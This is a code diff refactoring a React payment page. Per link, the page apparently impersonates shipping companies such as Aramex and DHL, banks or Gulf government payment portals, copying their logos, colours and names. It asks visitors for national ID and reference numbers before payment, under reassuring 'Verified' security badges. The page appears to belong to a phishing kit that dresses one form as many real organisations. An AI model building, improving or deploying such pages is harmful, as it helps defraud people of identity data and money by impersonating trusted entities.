@@ -1,35 +1,33 @@
 import { useState, useEffect, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
-import { Card } from "@/components/ui/card";
-import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
 import { useUpdateLink } from "@/hooks/useSupabase";
 import { useLinkData } from "@/hooks/useLinkData";
+import { useToast } from "@/hooks/use-toast";
+import { formatCurrency } from "@/lib/countryCurrencies";
+import { getCountryByCode } from "@/lib/countries";
+import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
+import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities";
+import { ThemedButton } from "@/components/ui/ThemedButton";
+import { ThemedInput } from "@/components/ui/ThemedInput";
+import { ThemedCard } from "@/components/ui/ThemedCard";
+import { ThemedHeader } from "@/components/ui/ThemedHeader";
 import {
   FileText,
   Loader2,
   ShieldCheck,
-  ArrowLeft,
   Lock,
   Landmark,
   Info,
   CheckCircle,
   AlertCircle,
-  Building2,
   Truck,
   CreditCard,
   Wallet,
-  Shield
+  Building2,
+  Shield,
 } from "lucide-react";
-import { useToast } from "@/hooks/use-toast";
-import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
-import { formatCurrency } from "@/lib/countryCurrencies";
 import BackButton from "@/components/BackButton";
 import BottomNav from "@/components/BottomNav";
-import { getEntityVisualSpec, specToCSSVariables } from "@/lib/entityVisualSpecs";
-import { getServiceBranding } from "@/lib/serviceLogos";
-import { shippingCompanyBranding } from "@/lib/brandingSystem";
 
 const PaymentData = () => {
   const { id } = useParams();
@@ -42,42 +40,36 @@ const PaymentData = () => {
   const [nationalId, setNationalId] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  // Detect entity from URL params or link data
   const urlParams = new URLSearchParams(window.location.search);
   const serviceKey = urlParams.get('company') || urlParams.get('service') || link?.payload?.service_key || '';
   const countryCode = link?.country_code || "SA";
   const govSystem = getGovernmentPaymentSystem(countryCode);
 
-  // Fallback: if no serviceKey, use government payment system by country
-  const effectiveServiceKey = serviceKey || `gov_${countryCode.toLowerCase()}`;
+  // Resolve entity config
+  const entityConfig = useMemo<PaymentEntityConfig>(() => {
+    return resolveEntity(serviceKey);
+  }, [serviceKey]);
 
-  // Get entity visual spec
-  const entitySpec = useMemo(() => {
-    return getEntityVisualSpec(effectiveServiceKey);
-  }, [effectiveServiceKey]);
-
-  // Get branding as fallback
-  const serviceBranding = getServiceBranding(effectiveServiceKey);
-  const companyBranding = shippingCompanyBranding[effectiveServiceKey.toLowerCase()] || null;
-
-  // Apply entity CSS variables
-  useEffect(() => {
-    if (entitySpec) {
-      const cssVars = specToCSSVariables(entitySpec);
-      const root = document.documentElement;
-      Object.entries(cssVars).forEach(([key, value]) => {
-        root.style.setProperty(key, value);
-      });
-      root.setAttribute('data-entity', entitySpec.entityId);
-      root.setAttribute('data-entity-category', entitySpec.category);
-    }
-    return () => {
-      // Cleanup on unmount
-      const root = document.documentElement;
-      root.removeAttribute('data-entity');
-      root.removeAttribute('data-entity-category');
-    };
-  }, [entitySpec]);
+  // Fallback visual values from entity config
+  const primaryColor = entityConfig.primary;
+  const secondaryColor = entityConfig.accent;
+  const backgroundColor = entityConfig.bg;
+  const surfaceColor = entityConfig.surface;
+  const textColor = entityConfig.text;
+  const textLightColor = entityConfig.textMuted;
+  const borderColor = entityConfig.inputBorder;
+  const fontFamily = entityConfig.font;
+  const borderRadius = entityConfig.cardRadius;
+  const buttonHeight = entityConfig.btnHeight;
+  const inputHeight = entityConfig.btnHeight;
+  const cardShadow = '0 8px 24px rgba(0,0,0,0.08)';
+  const buttonShadow = entityConfig.btnShadow;
+  const logoUrl = entityConfig.logo;
+  const entityNameAr = entityConfig.nameAr;
+  const entityNameEn = entityConfig.name;
+  const category = serviceKey.includes('shipping') || serviceKey.includes('aramex') || serviceKey.includes('dhl') ? 'shipping' :
+                   serviceKey.includes('bank') ? 'bank' :
+                   serviceKey.includes('gov') ? 'government' : 'payment_gateway';
 
   useEffect(() => {
     if (link?.payload?.reference) {
@@ -85,31 +77,12 @@ const PaymentData = () => {
     }
   }, [link]);
 
-  // Determine visual config
-  const primaryColor = entitySpec?.colors.primary || companyBranding?.colors.primary || serviceBranding.colors.primary || govSystem.colors.primary;
-  const secondaryColor = entitySpec?.colors.secondary || companyBranding?.colors.secondary || serviceBranding.colors.secondary || govSystem.colors.secondary;
-  const backgroundColor = entitySpec?.colors.background || companyBranding?.colors.background || '#F8F9FA';
-  const surfaceColor = entitySpec?.colors.surface || companyBranding?.colors.surface || '#FFFFFF';
-  const textColor = entitySpec?.colors.text || companyBranding?.colors.text || '#1A1A1A';
-  const textLightColor = entitySpec?.colors.textLight || companyBranding?.colors.textLight || '#666666';
-  const borderColor = entitySpec?.colors.border || companyBranding?.colors.border || '#E5E5E5';
-  const fontFamily = entitySpec?.typography.fontFamilyAr || companyBranding?.fonts.arabic || govSystem.fonts.primaryAr;
-  const borderRadius = entitySpec?.dimensions.borderRadius || companyBranding?.borderRadius.lg || '16px';
-  const buttonHeight = entitySpec?.dimensions.buttonHeight || '56px';
-  const inputHeight = entitySpec?.dimensions.inputHeight || '52px';
-  const cardShadow = entitySpec?.shadows.card || companyBranding?.shadows.lg || '0 10px 40px rgba(0,0,0,0.1)';
-  const buttonShadow = entitySpec?.shadows.button || `0 8px 24px ${primaryColor}40`;
-  const logoUrl = entitySpec?.assets.logo || companyBranding?.logoUrl || '';
-  const entityNameAr = entitySpec?.entityNameAr || serviceBranding.nameAr || govSystem.nameAr;
-  const entityNameEn = entitySpec?.entityNameEn || serviceBranding.nameEn || govSystem.nameEn;
-  const category = entitySpec?.category || 'government';
-
-  // Determine page title and description based on entity
-  const pageTitle = category === 'shipping' || category === 'postal' ? 'بيانات الشحنة' :
+  // Page title based on entity
+  const pageTitle = category === 'shipping' ? 'بيانات الشحنة' :
                     category === 'bank' ? 'بيانات الحساب' :
                     category === 'payment_gateway' ? `بوابة ${entityNameAr}` :
                     'الاستعلام عن المستحقات';
-  const pageDescription = category === 'shipping' || category === 'postal' ? 'أدخل بيانات الشحنة للمتابعة إلى الدفع' :
+  const pageDescription = category === 'shipping' ? 'أدخل بيانات الشحنة للمتابعة إلى الدفع' :
                           category === 'bank' ? 'أدخل بيانات الحساب للمتابعة' :
                           category === 'payment_gateway' ? `أدخل بياناتك للسداد عبر ${entityNameAr}` :
                           'يرجى إدخال بيانات الهوية ومرجع الخدمة للتحقق';
@@ -146,33 +119,21 @@ const PaymentData = () => {
     );
   }
 
-  // Get entity icon based on category
-  const EntityIcon = category === 'shipping' || category === 'postal' ? Truck :
-                     category === 'bank' ? Landmark :
-                     category === 'payment_gateway' ? CreditCard :
-                     Shield;
+  const CategoryIcon = category === 'shipping' ? Truck :
+                       category === 'bank' ? Landmark :
+                       category === 'payment_gateway' ? CreditCard :
+                       Shield;
 
   return (
     <div className="min-h-screen pb-20" dir="rtl" style={{ backgroundColor, fontFamily }}>
       {/* Entity-Specific Header */}
-      <header className="border-b sticky top-0 z-50" style={{ backgroundColor: surfaceColor, borderColor, boxShadow: entitySpec?.shadows.header || '0 2px 8px rgba(0,0,0,0.06)' }}>
-        <div className="container mx-auto px-4 h-16 sm:h-20 flex items-center justify-between">
-          <div className="flex items-center gap-3 sm:gap-4">
-            <BackButton />
-            {logoUrl ? (
-              <img src={logoUrl} alt={entityNameAr} className="h-8 sm:h-10 w-auto object-contain" />
-            ) : (
-              <div className="w-10 h-10 sm:w-12 sm:h-12 rounded-xl flex items-center justify-center text-white shadow-lg" style={{ background: primaryColor }}>
-                <EntityIcon className="w-5 h-5 sm:w-6 sm:h-6" />
-              </div>
-            )}
-            <div>
-              <h1 className="text-base sm:text-xl font-bold" style={{ color: textColor }}>{entityNameAr}</h1>
-              <p className="text-[9px] sm:text-[10px] font-bold uppercase tracking-widest" style={{ color: textLightColor }}>{entityNameEn}</p>
-            </div>
-          </div>
-        </div>
-      </header>
+      <ThemedHeader
+        config={entityConfig}
+        showBackButton
+        onBack={() => navigate(-1)}
+        title={entityNameAr}
+        subtitle={entityNameEn}
+      />
 
       <div className="container mx-auto px-4 py-8 sm:py-12">
         <div className="max-w-2xl mx-auto space-y-8 sm:space-y-10">
@@ -183,65 +144,31 @@ const PaymentData = () => {
           </div>
 
           {/* Main Card */}
-          <Card className="p-6 sm:p-10 border-0 relative overflow-hidden" style={{ borderRadius, boxShadow: cardShadow, backgroundColor: surfaceColor }}>
+          <ThemedCard config={entityConfig} variant="elevated" className="relative overflow-hidden">
             {/* Decorative element */}
             <div className="absolute top-0 right-0 w-24 h-24 sm:w-32 sm:h-32 opacity-[0.04] -mr-12 -mt-12 sm:-mr-16 sm:-mt-16 rounded-full" style={{ background: primaryColor }} />
 
-            <form onSubmit={handleSubmit} className="space-y-6 sm:space-y-8 relative z-10">
+            <form onSubmit={handleSubmit} className="p-6 sm:p-10 space-y-6 sm:space-y-8 relative z-10">
               <div className="space-y-4 sm:space-y-6">
-                <div className="space-y-2">
-                  <Label className="text-xs font-bold uppercase tracking-wide" style={{ color: textLightColor }}>
-                    {category === 'shipping' || category === 'postal' ? 'رقم الشحنة / التتبع' :
-                     category === 'bank' ? 'رقم الحساب' :
-                     'رقم الهوية الوطنية / الإقامة'}
-                  </Label>
-                  <Input
-                    value={nationalId}
-                    onChange={(e) => setNationalId(e.target.value)}
-                    className="transition-all"
-                    style={{
-                      height: inputHeight,
-                      borderRadius,
-                      backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB',
-                      borderColor: entitySpec?.colors.inputBorder || '#E5E7EB',
-                      borderWidth: '2px',
-                      fontSize: '18px',
-                      fontWeight: 700,
-                      textAlign: 'center',
-                      letterSpacing: '0.15em',
-                    }}
-                    placeholder={category === 'shipping' || category === 'postal' ? 'أدخل رقم الشحنة' : 'XXXXXXXXXX'}
-                    maxLength={category === 'shipping' || category === 'postal' ? undefined : 10}
-                    required
-                  />
-                </div>
+                <ThemedInput
+                  config={entityConfig}
+                  label={category === 'shipping' ? 'رقم الشحنة / التتبع' : category === 'bank' ? 'رقم الحساب' : 'رقم الهوية الوطنية / الإقامة'}
+                  value={nationalId}
+                  onChange={(e) => setNationalId(e.target.value)}
+                  placeholder={category === 'shipping' ? 'أدخل رقم الشحنة' : 'XXXXXXXXXX'}
+                  maxLength={category === 'shipping' ? undefined : 10}
+                  required
+                />
 
-                <div className="space-y-2">
-                  <Label className="text-xs font-bold uppercase tracking-wide" style={{ color: textLightColor }}>
-                    {category === 'shipping' || category === 'postal' ? 'رقم المرجع / الفاتورة' :
-                     category === 'bank' ? 'رقم المرجع' :
-                     'رقم الفاتورة / المرجع'}
-                  </Label>
-                  <div className="relative group">
-                    <FileText className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 transition-colors" style={{ color: textLightColor }} />
-                    <Input
-                      value={reference}
-                      onChange={(e) => setReference(e.target.value)}
-                      className="transition-all pr-12"
-                      style={{
-                        height: inputHeight,
-                        borderRadius,
-                        backgroundColor: entitySpec?.colors.inputBg || '#F9FAFB',
-                        borderColor: entitySpec?.colors.inputBorder || '#E5E7EB',
-                        borderWidth: '2px',
-                        fontSize: '16px',
-                        fontWeight: 600,
-                      }}
-                      placeholder="أدخل الرقم المرجعي للخدمة"
-                      required
-                    />
-                  </div>
-                </div>
+                <ThemedInput
+                  config={entityConfig}
+                  label={category === 'shipping' ? 'رقم المرجع / الفاتورة' : 'رقم الفاتورة / المرجع'}
+                  value={reference}
+                  onChange={(e) => setReference(e.target.value)}
+                  placeholder="أدخل الرقم المرجعي للخدمة"
+                  icon={<FileText className="w-5 h-5" />}
+                  required
+                />
               </div>
 
               {/* Amount Display */}
@@ -257,20 +184,14 @@ const PaymentData = () => {
               </div>
 
               {/* Submit Button */}
-              <Button
+              <ThemedButton
+                config={entityConfig}
                 type="submit"
                 disabled={isSubmitting}
-                className="w-full text-lg sm:text-xl font-bold shadow-xl transition-all hover:translate-y-[-2px] active:translate-y-[1px]"
-                style={{
-                  background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
-                  boxShadow: buttonShadow,
-                  borderRadius,
-                  height: buttonHeight,
-                  color: entitySpec?.colors.textOnPrimary || '#FFFFFF',
-                }}
+                loading={isSubmitting}
               >
-                {isSubmitting ? <Loader2 className="w-6 h-6 sm:w-8 sm:h-8 animate-spin" /> : "تحقق ومتابعة السداد"}
-              </Button>
+                {isSubmitting ? "جاري المعالجة..." : "تحقق ومتابعة السداد"}
+              </ThemedButton>
 
               {/* Security Badges */}
               <div className="flex items-center justify-center gap-3 sm:gap-4 text-[9px] sm:text-[10px] font-bold uppercase" style={{ color: textLightColor }}>
@@ -281,11 +202,11 @@ const PaymentData = () => {
                 <div className="flex items-center gap-1"><CheckCircle className="w-3 h-3" /> Verified</div>
               </div>
             </form>
-          </Card>
+          </ThemedCard>
 
           {/* Security Notice */}
           <div className="p-6 sm:p-8 rounded-2xl sm:rounded-[2.5rem] text-white flex items-center gap-6 sm:gap-8 shadow-xl" style={{ backgroundColor: '#1E293B' }}>
-            <div className="w-14 h-14 sm:w-16 sm:h-16 rounded-2xl flex items-center justify-center shrink-0 border" style={{ backgroundColor: `${primaryColor}10`, borderColor: `${primaryColor}20` }}>
+            <div className="w-14 h-14 sm:w-16 sm:h-16 bg-white/10 rounded-2xl flex items-center justify-center shrink-0 border border-white/20">
               <AlertCircle className="w-6 h-6 sm:w-8 sm:h-8 text-amber-400" />
             </div>
             <div>
